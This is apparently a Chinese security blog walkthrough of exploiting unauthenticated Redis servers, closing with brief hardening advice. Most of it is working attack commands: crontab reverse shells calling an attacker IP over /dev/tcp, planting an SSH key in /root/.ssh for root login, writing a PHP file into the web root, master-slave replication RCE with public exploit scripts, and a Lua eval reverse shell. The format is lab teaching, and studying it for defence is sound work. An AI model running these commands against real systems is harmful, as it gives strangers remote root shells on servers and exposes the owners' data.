
# [](#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8D%B1%E5%AE%B3 "Redis 未授权漏洞的利用以危害")Redis 未授权漏洞的利用以危害[](#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8D%B1%E5%AE%B3)

[![](assets/1702372985-fcf7441ef68ed6e110ce7a2558a7cf81.jpg)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/banner.jpg)

## [](#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B%E4%BB%A5%E5%8F%8A%E5%8D%B1%E5%AE%B3 "一、漏洞简介以及危害")一、漏洞简介以及危害[](#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B%E4%BB%A5%E5%8F%8A%E5%8D%B1%E5%AE%B3)

### [](#%E4%BB%80%E4%B9%88%E6%98%AFRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%9A "什么是Redis未授权访问漏洞：")什么是Redis未授权访问漏洞：[](#%E4%BB%80%E4%B9%88%E6%98%AFRedis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%EF%BC%9A)

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized\_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

### [](#2-%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9A "2. 漏洞的危害：")2\. 漏洞的危害：[](#2-%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3%EF%BC%9A)

攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized\_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。

### [](#3-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%EF%BC%9A "3.漏洞影响：")3.漏洞影响：[](#3-%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%EF%BC%9A)

[![](assets/1702372985-06a405b50088bd1533228aaf65787641.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/1.png)

根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：

[![](assets/1702372985-c43e0244d99b8f40953a8e6383824225.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/2.png)

全球无验证可直接利用Redis TOP 10国家与地区：

[![](assets/1702372985-2a9fa077a89ef0b7ca567e86006048cc.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/3.png)

可见当不安全的配置和疏忽的失误即可造成巨大的损失。

## [](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0 "二、漏洞复现")二、漏洞复现[](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

### [](#1-%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA "1.服务搭建")1.服务搭建[](#1-%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA)

#### [](#1-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85 "1.编译安装")1.编译安装[](#1-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85)

```plain

搭建环境
    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
    tar xzf redis-3.2.0.tar.gz
    cd redis-3.2.0
    make
更改配置文件
    vim redis.conf
注释掉 bind 127.0.0.1 并将 protected-mode 改成 no
    # bind 127.0.0.1
    protected-mode no
```

[![](assets/1702372985-99376a4725bc3f08a1397a29a87a509c.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/4.png)

```awk
开启redis
    ./src/redis-server redis.conf
```

[![](assets/1702372985-d17830f26a2b46dfd681750404725503.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/5.png)

服务启动成功

#### [](#2-docker-%E7%8E%AF%E5%A2%83 "2.docker 环境")2.docker 环境[](#2-docker-%E7%8E%AF%E5%A2%83)

```plain
docker pull damonevking/redis5.0
docker run -p 6379:6379 -d damonevking/redis5.0 redis-server //映射端口并运行容器
```

### [](#2-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95 "2. 未授权访问漏洞测试")2\. 未授权访问漏洞测试[](#2-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95)

#### [](#1-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93 "1. 未授权访问数据库")1\. 未授权访问数据库[](#1-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93)

启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：

```plain

redis-cli -h <IP> # 未授权访问IP
```

[![](assets/1702372985-8ff4ddeabc1b8925bfb1d8eb004aeabf.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/6.png)

登录的结果可以看出该redis服务对公网开放，且未启用认证。

```plain
    > info   # 查看 redis 版本信息、一些具体信息、服务器版本信息等等:
    > CONFIG GET dir # 获取默认的 redis 目录
    > CONFIG GET dbfilename # 获取默认的 rdb 文件名
```

举例输入info,查看到大量敏感信息。

[![](assets/1702372985-e4d0d08133d68102982b7cc0240e4935.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/7.png)

#### [](#2-%E5%88%A9%E7%94%A8crontab%E5%8F%8D%E5%BC%B9shell "2.利用crontab反弹shell")2.利用crontab反弹shell[](#2-%E5%88%A9%E7%94%A8crontab%E5%8F%8D%E5%BC%B9shell)

在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell

先在自己的kali/服务器上监听一个端口nc -nlvp 5678

[![](assets/1702372985-6b246f8aaa9dcfa1cdad581a4f47e1b8.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/8.png)

然后通过未授权访问连接上服务器执行命令

```plain
config set dir /var/spool/cron

set -.- "\n\n\n* * * * * bash i >& /dev/tcp/<kali的IP>/<端口> 0>&1\n\n\n"

set -.- "\n\n\n* * * * * bash i >& /dev/tcp/192.168.16.59/5678 0>&1\n\n\n"

或者
set x "\n* * * * * /bin/bash i > /dev/tcp/<kali的IP>/<端口> 0<&1 2>&1\n"

set x "\n* * * * * /bin/bash i >& /dev/tcp/192.168.16.59/5678 0<&1 2>&1\n"

config set dbfilename root
save
```

[![](assets/1702372985-00eef55c6654ce5902bf5ff4b5dff1f9.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/9.png)

待任务执行后会弹到kali的nc上，过一分钟左右就可以收到shell

[![](assets/1702372985-e0dbab9d1e7c86e29ccb69e52ce7ff7e.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/10.png)

再上线到CS做权限维持和后渗透

[![](assets/1702372985-29d9af65096cf1ade1cf242b85c08a07.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/11.png)

### [](#3-%E5%88%A9%E7%94%A8%E5%85%AC%E7%A7%81%E9%92%A5%E8%AE%A4%E8%AF%81%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90 "3.利用公私钥认证获得root权限")3.利用公私钥认证获得root权限[](#3-%E5%88%A9%E7%94%A8%E5%85%AC%E7%A7%81%E9%92%A5%E8%AE%A4%E8%AF%81%E8%8E%B7%E5%BE%97root%E6%9D%83%E9%99%90)

在以下条件下,可以利用此方法

-   Redis 服务使用 ROOT 账号启动
    
-   服务器开放了 SSH 服务,而且允许使用密钥登录,即可远程写入一个公钥,直接登录远程服务器.
    

**实例**

1.  靶机中开启redis服务：`redis-server /etc/redis.conf`
    
2.  在靶机中执行 `mkdir /root/.ssh` 命令，创建`ssh`公钥存放目录
    

在攻击机中生成ssh公钥和私钥，密码设置为空：

```plain
ssh-keygen -t rsa
```

[![](assets/1702372985-2ec4bff025afb91fefe6574e56cafe3a.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/12.png)

进入`.ssh`目录：`cd .ssh/`，将生成的公钥保存到`test.txt`：

```plain
# 将公钥的内容写到一个文本中命令如下
(echo -e "\n\n"; cat id_rsa.pub; echo e "\n\n") > test.txt
```

[![](assets/1702372985-3c00587120fb794b50b2beaddd49a7f3.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/13.png)

链接靶机上的`redis`服务，将保存`ssh`的公钥`1.txt`写入`redis`（使用`redis-cli -h ip`命令连接靶机，将文件写入）

```plain
  cat test.txt | redis-cli -h <hostname> -x set test
```

[![](assets/1702372985-2d9ca6626d4f6080d6b2fed658fcd899.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/14.png)

远程登录到靶机 redis 数据库，并使用`CONFIG GET dir`命令得到redis备份的路径：

[![](assets/1702372985-d778cf2b0db9a6f2c836c572dc610942.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/15.png)

更改redis备份路径为ssh公钥存放目录（一般默认为`/root/.ssh`）：

[![](assets/1702372985-9f6b483f68d61220babbee4a78fb2df2.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/16.png)

此时通过ssh 连接到靶机

```plain
ssh -i id_rsa root@<ip>
```

[![](assets/1702372985-63fc3f261446f195d201647cadea8d7c.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/17.png)

### [](#4-%E5%88%A9%E7%94%A8redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99-Webshell "4.利用redis 未授权写 Webshell")4.利用redis 未授权写 Webshell[](#4-%E5%88%A9%E7%94%A8redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99-Webshell)

利用前提：

-   靶机redis链接未授权，在攻击机上能用`redis-cli`连上
-   当 redis 权限不高时,并且服务器开着 web 服务,在 redis 有 web 目录写权限时,可以尝试往 web 路径写 webshell

此时我们需要知道目标的 web路径，示例写入的是apache的默认安装路径

```plain
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php phpinfo();?>"
save
```

[![](assets/1702372985-cf1dec4cc22d79c1485b9dcaad6d8f26.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/18.png)

此时 phpinfo已经写入目标路径下

[![](assets/1702372985-d7c468d2d1bf46e25845728912c51520.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/19.png)

访问目标网站

[![](assets/1702372985-92ed8260e90bfdc4c28f7668b6477604.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/20.png)

### [](#5-%E5%88%A9%E7%94%A8%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell "5.利用主从复制GetShell")5.利用主从复制GetShell[](#5-%E5%88%A9%E7%94%A8%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6GetShell)

先讲解一下 redis 的主从模式：

指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力。

这里我们开两台redis数据库来做测试

[![](assets/1702372985-be951c298488a8e187e291d73af099b5.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/21.png)

然后通过slaveof可以设置主从状态

```plain
slaveog <主redis ip><端口号>
```

[![](assets/1702372985-3ccfe56b53baaf09eabfd79e751a1e79.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/22.png)

这样一来数据就会自动同步了

当服务器开启主从同步后，利用脚本

```plain
git clone https://github.com/Ridter/redis-rce.git   //下载漏洞利用脚本
https://github.com/n0b0dyCN/redis-rogue-server //脚本需要调用这里的 exp.so文件
```

将exp.so文件下载并放到和redis-rce.py同一目录下,执行命令：

```plain
python3 redis-rce.py -r <目标ip> -L <自己IP> -f exp.so
```

[![](assets/1702372985-39c4900964d216aeededce4d4a2646f3.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/23.png)

在此处：`i为交互式shell`，r为反弹shell，根据自己的需要选择就可以了

[![](assets/1702372985-86931b1f9a33ca5645189b2653a613be.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/24.png)

### [](#6-%E5%88%A9%E7%94%A8-redisLua-RCE "6.利用 redisLua RCE")6.利用 redisLua RCE[](#6-%E5%88%A9%E7%94%A8-redisLua-RCE)

```plain
git clone https://github.com/QAX-A-Team/redis_lua_exploit.git //下载漏洞利用脚本
```

测试环境：`centos6.5+redis 2.6.16`

脚本为 python2，运行脚本需先安装 `python2 redis` 组件

```plain
python2 -m pip install redis //为python2 安装redis组件
```

修改脚本中 host为目标 IP。  
[![](assets/1702372985-4b7731255cb6f07cd67162d9178a737f.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/25.png)

通过`redis-cli`连接到目标 redis ，执行`eval "tonumber('whoami', 8)" 0`这段 lua，目标服务器就会执行whoami命令。

```plain
eval "tonumber('whoami', 8)" 0 //执行命令
```

此时我们使用回弹shell 测试一下，先开启 nc监听：

```plain
nc -lvnp 5678
```

再连接上数据库执行会弹语句：

```plain
eval "tonumber('/bin/bash -i >& /dev/tcp/<攻击机ip>/<端口信息> 0>&1', 8)" 0
```

[![](assets/1702372985-b82d55e003556a3ba6a0bbc5338adeee.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/26.png)

[![](assets/1702372985-712b3e2b5e964daba1e134191ecdb223.png)](https://raw.githubusercontent.com/xidaner/ImageShackDrive/main/img/RED/WEB/Redis/27.png)

接收到回弹的shell，漏洞利用成功。

## [](#%E4%B8%89%E3%80%81%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE "三、修复建议")三、修复建议[](#%E4%B8%89%E3%80%81%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE)

### [](#1-%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE "1.限制访问")1.限制访问[](#1-%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE)

比较安全的办法是采用绑定IP的方式来进行控制。

请在`redis.conf`文件找到如下配置

```plain
# If you want you can bind a single interface, if the bind option is not
# specified all the interfaces will listen for incoming connections.
#
# bind 127.0.0.1
```

把 `#bind 127.0.0.1`前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:`redis-server`，改为:r`edis-server path/redis.conf` 即在启动的时候指定需要加载的配置文件,其中`path/`是你上面修改的redis配置文件所在目录。

#### [](#2-%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81 "2.设置密码")2.设置密码[](#2-%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81)

打开`redis.conf`配置文件，找到`requirepass`，然后修改如下:

```plain
requirepass yourpassword
yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。

命令如下:
redis-cli -h yourIp -p yourPort//启动redis客户端，并连接服务器
keys * //输出服务器中的所有key
报错如下
(error) ERR operation not permitted

这时候你可以用授权命令进行授权，就不报错了

命令如下:
auth youpassword
```

**学习与参考**

-   [https://blog.csdn.net/jia3643/article/details/106151585](https://blog.csdn.net/jia3643/article/details/106151585)
-   [https://blog.csdn.net/weixin\_35989968/article/details/113315619](https://blog.csdn.net/weixin_35989968/article/details/113315619)

- - -

[数据库](http://xidaner.blog.ffffffff0x.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/) [Redis](http://xidaner.blog.ffffffff0x.com/tags/Redis/) [未授权访问](http://xidaner.blog.ffffffff0x.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/)

本博客所有文章除特别声明外，均采用 [CC BY-SA 4.0 协议](https://creativecommons.org/licenses/by-sa/4.0/deed.zh) ，转载请注明出处！

[↓↓↓](http://xidaner.blog.ffffffff0x.com/2022/04/18/NW-NTLM-1/)  
  
内网渗透--NTLM中继与反射浅析  
  
[↑↑↑](http://xidaner.blog.ffffffff0x.com/2022/04/18/NW-NTLM-1/)

[↓↓↓](http://xidaner.blog.ffffffff0x.com/2022/03/01/CSNEIWANG/)  
  
内网横向--CS工具使用教程  
  
[↑↑↑](http://xidaner.blog.ffffffff0x.com/2022/03/01/CSNEIWANG/)
